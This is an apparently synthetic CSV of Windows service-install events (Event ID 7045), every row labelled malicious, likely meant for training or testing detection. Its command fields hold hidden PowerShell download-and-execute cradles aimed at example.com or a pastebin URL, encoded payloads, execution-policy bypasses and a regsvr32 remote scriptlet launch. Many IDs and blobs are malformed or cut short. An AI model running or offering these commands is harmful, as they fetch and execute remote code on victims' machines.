 Label,Event ID,Service Name,Service File Name,Service Type,Service Start Type,Service Account,Data Service Name,Timestamp,ID
malicious,7045,SvchostX,"%windir%\system32\cmd.exe /c powershell -w hidden -c ""iwr -uri http://example.com/malware.exe -outfile $env:temp\malware.exe; start $env:temp\malware.exe""",Own Process,Auto Start,LocalSystem,KpG4b,2024-09-01T10:45:20.219Z,4c87a2f3-521d-4a53-8d34-23f2c1aax
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -ep bypass -nop -w hidden -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,aG4k,2024-07-22T03:41:19.982Z,42a91c5b-2198-4123-b12d-34c6a98f7x
malicious,7045,,"%windir%\system32\cmd.exe /c powershell -windowstyle hidden -Command ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1');""",Own Process,Auto Start,LocalSystem,a5Kg,2024-08-15T02:47:12.192Z,4f3a2e12-8421-4c11-8e34-1a2b3c4d5ex
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -ExecutionPolicy Bypass -File ""C:\Users\Public\ Documents\script.ps1""",Own Process,Demand Start,LocalService,4S2K,2024-03-22T11:14:02.219Z,3b6f4994-2191-43a7-9cfe-8123456789x
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -ep bypass -nop -w hidden -c ""IEX(New-Object System.Net.WebClient).DownloadString('https://example[.]com/malware.ps1')""",Own Process,Auto Start,LocalSystem,4KtG8,2024-08-20T08:41:23.191Z,53f21a5c-4421-44bd-bd87-91a3f4c6c55x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell.exe -enc JABzAGUAcgBlA...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,j4G9,2024-03-22T08:41:19.421Z,4bdf8b45-2e71-4a32-95f1-4a8e45a9cxx
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -File ""C:\Users\Public\temp.ps1""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,pRtY,2024-09-01T08:45:12.192Z,4b2a5e71-2211-4f1a-b3d7-4321ghjklx
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('https://example.com/malware.ps1')""",Own Process,Auto Start,LocalService,a7kH4,2024-08-19T08:47:12.219Z,458213a1-f81c-495a-bd6e-4f2f1a3cxx
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File ""C:\Users\Public\svchost.exe""",Own Process,Auto Start,LocalSystem,aG4Kp,2024-08-20T08:45:12.219Z,4a2f9a92-14b4-4352-bc91-23hjk4dx
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABzAG0APQ...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,aH4K,2024-07-22T08:42:19.562Z,43a73e5a-e89f-42d3-9c64-7b123edcxx
malicious,7045,SvchostX,%windir%\system32\cmd.exe /c start /min powershell -ep bypass -w hidden -enc JABzAD0A...,Own Process,Auto Start,LocalSystem,4Kq8,2024-08-20T08:41:19.219Z,f73b42c1-1a91-4f12-ba23-23456a7b9cx
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -Command ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1');""",Own Process,Auto Start,LocalSystem,4yJpL8,2024-03-22T08:41:19.502Z,43f2dc1e-9a4b-4123-98ghklo-rt7x
malicious,7045,SuspiciousServ,"%windir%\system32\cmd.exe /c start /b /min powershell -exe bypass -windowstyle hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,Gp45B,2024-08-20T09:45:12.219Z,3f2e1d4c-9b41-4211-8d72-11e6f8e7x
malicious,7045,SuspiciousUpdate,%windir%\system32\cmd.exe /c powershell -w hidden -enc JAB...),Own Process,Demand Start,NT AUTHORITY\SYSTEM,aG4Kq,2024-03-10T08:41:22.191Z,43f981e2-4dab-4e91-93e1-4444xxxxx
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JABpAHMAeQBzAHQ...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,BXoR3D,2024-03-22T08:42:11.219Z,4a82f511-251c-4a5e-8df1-9f8d4b976c1x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -WindowStyle hidden -ExecutionPolicy bypass -File ""C:\Users\Public\update.ps1""",Own Process,Auto Start,LocalSystem,4kJ8a,2024-03-22T19:45:12.219Z,4a731dc1-9e53-4218-93e1-1a2b3c4d5ex
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JABzAGUAbgBkAGUAYQB0AF8AcgBFAFIAVwBlAHIAcwBpAG8AbgA9ACIA,Own Process,Auto Start,LocalSystem,kP4Rg,2024-02-20T03:45:12.192Z,2f9a1b43-1e4d-49dc-b234-51e5a4c8b6dx
malicious,7045,StealthService,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4SdL8,2024-08-20T08:45:12.219Z,2b31f45a-9f81-4a53-82bc-fg7t6r5x
malicious,7045,HiddenUpdater,%windir%\system32\cmd.exe /c powershell -ep bypass -nop -w hidden iex (new-object net.webclient).downloadstring('http://example.com/malware.ps1'),Own Process,Auto Start,LocalSystem,aG4k,2024-08-20T08:45:12.219Z,3f241a62-c5d4-49f3-ba56-e8b9a3c6e7hx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABzAGUAcgBlAGYAZQ...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4sDgR,2024-03-22T09:41:23.192Z,3fba4629-189c-4935-b15c-1edc6c0ax
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABjAG0AYQBpAGEAbgBkAC...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,aGxK,2024-07-22T09:41:19.421Z,8f549a43-1a45-4c12-bc9e-651a23b9cxx
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABjAGwAaQBlAG4AdAAgADoALwAvAHM...,Own Process,Auto Start,LocalSystem,4S6pL,2024-08-19T08:42:31.192Z,4cfeeec8-6425-4211-bced-a8741a3b6x
malicious,7045,HiddenUpdater,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalService,Hp4K,2024-09-01T08:42:11.219Z,38b91c5a-21e4-4d7f-9d45-8321c6c8f4dx
malicious,7045,UpdateAgent,"%windir%\system32\cmd.exe /c powershell -ep bypass -nop -w hidden -c ""IEX (New-Object System.Net.WebClient).DownloadString('https://example.com/malware.ps1');""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,4G7a,2024-07-22T03:41:19.421Z,43f7e231-4c55-4125-8a3f-1a879dcd9x
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JABlAHgAeQB5AGUAbgBkAGUAcgAgACIA,Own Process,Auto Start,LocalService,4SDFg,2024-07-22T08:45:12.192Z,43a87e1c-7b93-4dea-b2f4-85trewq1x
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,aG4Kp,2024-02-20T10:45:12.219Z,43a21c1d-95e2-4dcb-b3a8-5c2b1f9ax
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -exec bypass -window hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1');""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,aG4Kp,2024-08-20T08:41:19.219Z,3b7a2f51-4c9a-4123-8bfc-1324890a4bx
malicious,7045,StealthService,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAG0AaQBzAHQ...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4SdT,2024-03-20T08:45:12.219Z,3fda512b-4512-492a-9a6e-123456789012x
malicious,7045,SuspiciousUpdater,"%windir%\syswow64\cmd.exe /c powershell -w hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware.ps1'))""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4sGpL,2024-08-22T08:45:12.192Z,43a21d5f-6f93-49c5-9b72-5d8f6a7gtsx
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABjAGwAaQBOAGEAbQBlACAAIAAkAG4AZQB4AC4AYQBwAGgAaQBuAGcAJwBpAG4AcwBWAGUAcgBzAGUAcgB0AC4AVQBzAGUAcgBzAGUAeQAgAHsAJABjAGwAaQBOAGEAbQBlACAAIAAkAG4AZQB4AC4AYQBwAGgAaQBuAGcAJwBpAG4AcwBWAGUAcgBzAGUAcgB0AC4AVQBzAGUAcgBzAGUAeQAgAHsAJABjAGwAaQBOAGEAbQBlACAAIAAkAG4AZQB4AC4AYQBwAGgAaQBuAGcAJwBpAG4AcwBWAGUAcgBz,,,,,,
malicious,7045,Msrpcd,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,tH4n,2024-07-22T10:45:12.192Z,8a4c2b5f-1e23-4123-8e9f-456d2a3ex
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAG0AYgBpAG4AZAAoACgAJABzAG0AYgBpAG4AZAAoACgA,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4KLpG,2024-08-20T11:45:22.123Z,2a31d56f-4f32-41a3-9a4e-4d25c4f7d8ex
malicious,7045,SvchostX,"%windir%\system32\cmd.exe /c ""powershell -w hidden -encodedcommand JAB...""",Own Process,Demand Start,LocalService,4kLpA,2024-09-02T08:47:12.191Z,3fda83a4-4cd9-4121-ba59-fd78ca083dx
malicious,7045,MalSvc123,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAD0AJwAtAG4AbwBzAGUAIABsAG8AdQBpAGMAbwBuAHMAXQAiACkA,Own Process,Auto Start,LocalSystem,pK4F,2024-02-22T10:45:12.219Z,4c5a2b8d-62f4-49e4-b9df-3a9f9b8f6c5x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -e JABzAG0AZQ...,Own Process,Auto Start,LocalService,4S2k,2024-05-22T08:45:12.219Z,5177a42d-9ebd-4c11-b7a3-9e4f1c84981fx
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAYwB...,Own Process,Auto Start,LocalSystem,4SdLp,2024-08-20T07:41:22.191Z,947823a1-2b45-4123-85a4-9f6a2cd6x
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -ep bypass ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,4SDFg,2024-08-21T08:45:12.192Z,4d11c4e1-9b86-4352-92a3-12e345xx
malicious,7045,SvchostX,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,LocalSystem,aG4Kp,2024-07-22T08:41:19.421Z,4f61b9f3-2c4e-4a8f-8d5c-61f85cd3bx
malicious,7045,StealthyService,"%windir%\system32\cmd.exe /c ""powershell -w hidden -e JABlAG4AdgBpAHQAXQAkAGUAbgB0AHMAaQBjAGUALgBvAHIAZQBhAGQAZQBtAGEAdgBpAG8AbgAuAGMAbwBtAA==""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,GxRtLp,2024-08-20T08:43:21.192Z,4f7c9b42-2198-4a35-93e2-11f7c25592c8x
malicious,7045,StealthSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABlAHgAeQBzAHUAbQBlAG4A,Own Process,Auto Start,NT AUTHORITY\LocalService,aG4H,2024-08-20T10:45:12.219Z,43a211f5-267d-4e42-9fba-2de28f4cax
malicious,7045,updateSvc32,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Auto Start,LocalSystem,aG4k,2024-08-20T10:15:22.192Z,4a2b1d5c-9f83-42a1-8b43-1a4f9a2d4gx
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -Command ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1');""",Own Process,Auto Start,LocalSystem,4KtR7d,2024-08-20T08:45:12.192Z,43a1c9a8-11bf-4e7a-9d32-82a1b9cxx
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1');""",Own Process,Auto Start,LocalSystem,4KdLp,2024-08-22T08:41:12.219Z,231c46a8-5b23-4981-bc11-93asrwe-klp09x
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -ep bypass -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware')""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4SdF7g,2024-03-10T18:45:21.123Z,4c81d3b2-2f51-412a-bc34-87b6f19cx
malicious,7045,SysUpdateSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -Command ""Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4K7dL,2024-08-20T10:15:22.192Z,3c5a42e8-91d3-49c0-8e2f-522bb2e4dax
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -exec bypass -f ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,4K7nP,2024-08-20T08:45:12.192Z,4a86d1d5-42f9-4c1a-8e2d-5b61234567x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABlAG4AdgBvAHIAaABlAHMAdAA=,Own Process,Auto Start,LocalSystem,GxKH,2024-03-22T08:41:19.421Z,4f6c2b45-3a9c-43e2-92f1-5b8d269cxx
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell.exe -windowstyle hidden -exec bypass -command ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1')""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4KdL8,2024-08-20T07:41:23.219Z,83d1f5a9-4f32-4a32-bf45-d7a8e09b6f54x
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -e JABlAG4AdgBpAGMAYQB5AHQAcgBdADoAOgBTAGkAegBpAG4AMwB3AC4AMQA5AC4AQgBqAGUAYwB0ACgAJABpAGYAJQAnACkAOwB3AGUAYgBQAGUAYwB0ACgAKQAgAC0AbgBlAHcALQBvAGIAagBlAGMAdAA7ACQAYwA6ACQATgBhAG0AZQAgAC0AZQB4AHAAZwB1AGwAYQB5AFIAZQBzAHUAbAB0AC4AQQB1AHQAaQB2AGEAdABoAGUAcgBzAGUAIgA=,Own Process,Demand Start,LocalService,,,
malicious,7045,UpdateService,%windir%\system32\cmd.exe /c powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\update.ps1,Own Process,Auto Start,NT AUTHORITY\SYSTEM,x8KpL4,2024-09-02T08:45:12.219Z,4fba8f62-21ea-4f91-8a43-24a8e1f4cxx
malicious,7045,UpdateSvc32,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX(New-Object Net.WebClient).DownloadString('http://example.com/malware')""",Own Process,Auto Start,NT AUTHORITY\LocalService,aG4K,2024-08-19T06:53:12.141Z,3d8f9c53-1429-4a38-98a1-4a5a6b7c8dx
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JABzAGUAbgBkAGIAYQBnAGEAbQBwAGwAYQB5AFMAdAByAGUAYQBtACgAKQAuAGQAbwB3AG4AbABvAGEAZABlACgAJABpAGYAaQBjAGEAdABlACgAKQApACAAfTAHAAYQBuAGQAYQByAHQAbwBvAGwAbABlACgAJABpAGYAaQBjAGEAdABlACgA=,Own Process,Demand Start,LocalService,4lKq,2024-09-02T08:45:12.219Z,82734f51-2a91-4c12-8a45-92a7dfg6h5x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABlAHgAdAAuAHcAZQBuAGMAbwB0ACgAKABwAHIAbwB3AHMAZQByAHQAeQBwAGUATgBhAG0AZQAgAHsA,Own Process,Auto Start,LocalSystem,AzV9,2024-08-22T09:41:18.421Z,47e3c41a-1a14-429c-b2ad-f678e2c6x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -executionpolicy bypass -windowstyle hidden -nop -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4pL9,2024-08-20T08:41:12.192Z,25a3f41c-8e4c-43a5-9f1c-12345678x
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAG...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,KpGxe,2024-08-20T08:41:19.219Z,43a1f29a-9b11-46e9-a3fs-498251f1x
malicious,7045,UpdaterSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAD0A...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,KpG4,2024-07-22T10:15:32.192Z,45f23b91-2198-4c1f-bc11-9f8a1a0aax
malicious,7045,UpdateSvc,"%windir%\system32\cmd.exe /c powershell -ep bypass -nop -w hidden -c ""iwr -uri http://example.com/malware.exe -outf $env:appdata\malware.exe""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,4yK9L,2024-02-20T08:45:12.192Z,62f4a1d5-49c7-42a1-93de-1234567890x
malicious,7045,SysUpdateSvc,"%windir%\system32\cmd.exe /c powershell -ep bypass -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/abc123')""",Own Process,Auto Start,LocalSystem,tGx4,2024-07-22T08:15:32.192Z,4e331a6a-9c4d-4f23-85f1-7b2a11a4e2cx
malicious,7045,UpdaterSvc,"%windir%\system32\cmd.exe /c powershell -w hidden -ep bypass -c ""iwr -uri http://example.com/malware -outfile C:\Windows\Temp\malware.exe""",Own Process,Auto Start,LocalSystem,KpL8a,2024-08-20T08:45:12.219Z,4ecf2e3d-1234-4567-89ab-cdefghijkx
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABlAG4AdgBpAH...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4JGp,2024-03-20T10:45:12.219Z,2f51d2a3-1418-4f11-ba54-8c79f6a8a39ax
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c ""powershell -w hidden -enc ...",Own Process,Demand Start,LOCAL SERVICE,4sGpL,2024-09-02T08:41:22.191Z,4c1a33b2-3f51-442f-b5f8-9a37a35fx
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JABhAHMAcwBvAHcAZQByAHMAaABlAGwAbABhAHMAcwBvAHcAZQByAGUAYQB0AGUAcgAg...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,xK7aC,2024-09-02T03:14:21.219Z,3f4a56b2-1a85-4732-b8da-64f78a3b1x
malicious,7045,StealthSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGUAbgBkAGUAcgBzAGUANgA0AFMAdAByAGUAYQBtAGUAcgA=,Own Process,Auto Start,NT AUTHORITY\SYSTEM,pX5K,2024-09-02T08:41:19.218Z,4f5a2111-1e4f-42eb-8d4a-23456x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABjAGwAaQBlAHQAZQ...,Own Process,Auto Start,LocalService,4SdRt,2024-07-22T10:45:12.219Z,3b47521e-14d7-46a2-b34d-8a9bcf12x
malicious,7045,SuspiciousLoader,"%windir%\system32\cmd.exe /c powershell -ep bypass -nop -c ""iex ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Auto Start,NT AUTHORITY\SYSTEM,aZ4kG,2024-08-19T08:41:22.219Z,48239a67-4e22-11ed-8f6b-3f4eccf6e6x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object System.Net.WebClient).DownloadString('http://example.com/malware')""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,Gx4D,2024-08-20T07:41:19.219Z,2a6f9b4c-11e6-4f5a-85a6-a39r4f1x
malicious,7045,SuspiciousSvc,"%windir%\system32\cmd.exe /c powershell -exec bypass -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('https://example.com/malware'))""",Own Process,Auto Start,LocalSystem,aG4Kl,2024-09-01T08:45:12.219Z,4f7a82b9-1234-4567-89ab-1234567890x
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABzAGUAYwB...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4dL9a,2024-02-22T08:41:19.219Z,81a642f4-25e9-4c61-8e5b-5e6fghjklx
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Public\svchost.exe,Own Process,Auto Start,LocalSystem,4sGpL,2024-08-20T03:41:19.421Z,82734cd1-9b65-4123-91d7-efghijkx
malicious,7045,SuspiciousAgent,"%windir%\system32\cmd.exe /c powershell -w hidden -NoLogo -NonInteractive -ep bypass -c ""IEX ((new-object net.webclient).downloadstring('http://example.com/malware'))""",Own Process,Auto Start,LocalSystem,4SgRt,2024-03-21T02:47:12.192Z,2f43d9a5-14b1-4c45-b9f1-6a8b117cx
malicious,7045,StealthSvc,%windir%\system32\cmd.exe /c start /b /min powershell -w hidden -e JABlAG4AdgBvAG4AeQBsAGUAeAB3AGUAbgB0AHkAbQBuAGUAcwB0AHIAZQBhAGMAaQB2AGEAdABpAG8AbgBzAHQAcgBpAG4AZwAoAGIAeQB0AGUAcwBzAHQAcgBpAG4AZwAsACAAcwB0AHIAaQBuAGcAQwBvAG4AbgBlAGMAdAA=,Own Process,Demand Start,NT AUTHORITY\SYSTEM,t9x,2024-08-20T06:15:32.192Z,8c76f4c5-2e14-4b88-b3b9-5
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://example.com/malware.ps1');""",Own Process,Auto Start,LocalSystem,aG4K,2024-08-22T08:41:19.217Z,4a86f431-fd9c-42d3-91a2-1a4b9c53x
malicious,7045,StealthSvc,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -ExecutionPolicy Bypass -File C:\Users\Public\Documents\run.ps1,Own Process,Auto Start,LocalSystem,4SdL8,2024-08-20T07:42:11.219Z,4c5f87e2-3421-49d2-8r3t5-61f2gx
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -enc JABzAGMAcgBvAHMAZQByAHMAaABlAGwAbAA=,Own Process,Auto Start,NT AUTHORITY\SYSTEM,Gx4Ko,2024-08-20T08:41:19.421Z,83692a5d-2bc9-4f54-9d21-12b6d5a9a7x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c ""powershell -w hidden -enc JAB...""",Own Process,Demand Start,LocalService,Gx4KqV,2024-07-22T08:41:19.219Z,2c4d5a8f-4312-9a85-b23c-1234567890x
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JAAoACgAIAAkAGUAIg...,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4KpN7a,2024-09-01T08:45:21.192Z,3b597a4d-5a48-4a1b-a2ad-11223344x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c ""powershell -w hidden -enc JAB...""",Own Process,Demand Start,NT AUTHORITY\SYSTEM,4SDFg,2024-02-22T03:41:19.219Z,38f45cd2-2198-4123-ba93-213d9f8ax
malicious,7045,SuspiciousUpdater,%windir%\system32\cmd.exe /c powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\update.ps1,Own Process,Auto Start,LocalSystem,4SdL,2024-08-22T08:41:22.194Z,4a5e91f2-1105-49e2-8a5d-1f3c9e78ax
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JABlAG4AdgBpAGMAYQByAHQAcgBlAGEAbQA=,Own Process,Demand Start,NT AUTHORITY\SYSTEM,4mP9d,2024-09-01T10:15:22.192Z,82735d1-4eb9-4f82-b3c1-85a4c32f4e1x
malicious,7045,SuspiciousSvc,%windir%\system32\cmd.exe /c powershell -windowstyle hidden -enc JABlAHgAeQBkAGUAbgB0AGkAcwB0AGUAcgBzAGUAbgB0AC4AYQBtAGUAIAAtAE4AYQBtAGUASwB0AGkAbgBnAFMAeQBzAHQAZQBtAHAAbABhAHMAcwB3AGkAbgBkAGUAKAApADsAfQA=,Own Process,Auto Start,LocalSystem,4SdRg,2024-08-20T08:45:12.219Z,3f1ac9e4-9c88-41a2-93e7-9a4f7b883f4xx
malicious,7045,StealerService,%windir%\system32\cmd.exe /c powershell -w hidden -e JABzAD0AIAAnAGEAbgBkAC...,Own Process,Auto Start,NT AUTHORITY\SYSTEM,4sGK,2024-08-22T10:15:32.192Z,43ecb1a2-1a4b-4d42-9fc1-85hjkla3x
malicious,7045,UpdateSvc,%windir%\system32\cmd.exe /c powershell.exe -w hidden -encodedCommand ...,Own Process,Auto Start,LOCAL SERVICE,Gb4K,2024-09-02T07:46:14.219Z,43a68d11-ead2-4f8c-8f82-7e23f8d8x
malicious,7045,StealthyService,%windir%\system32\cmd.exe /c powershell -enc JABzAGUAbgBTAHQAYQByAHQAcgBlAGEAbQA=,Own Process,Demand Start,NT AUTHORITY\SYSTEM,kL5J9a,2024-09-01T08:42:19.015Z,46a21f3c-5b6d-4273-b471-8e351c7ax
malicious,7045,StealthSvc,%windir%\system32\cmd.exe /c regsvr32 /s /u /i:http://example.com/malware.sct scrobj.dll,Own Process,Auto Start,NT AUTHORITY\SYSTEM,4KpL9,2024-08-20T08:41:23.192Z,2f1d5c67-4c82-49e5-9f11-8b67d6ac85f8x
malicious,7045,SysUpdateSvc,%windir%\system32\cmd.exe /c powershell -w hidden -e JABzAD0AYwBpAGUAbgB0AHkALgBzAHQAbwBzAHQAYQ...,Share Process,Demand Start,NT AUTHORITY\SYSTEM,aE4K1p,2024-03-21T08:45:10.219Z,83654bc2-31e8-4907-bc81-7a4d9c39x
malicious,7045,SuspiciousUpdater,"%windir%\system32\cmd.exe /c powershell -windowstyle hidden -exec bypass -f ""C:\Users\Public\Documents\update.ps1""",Own Process,Auto Start,LocalSystem,Gx4K,2024-08-22T08:41:12.421Z,4a8f31cd-25e3-4b83-93a4-11223344x
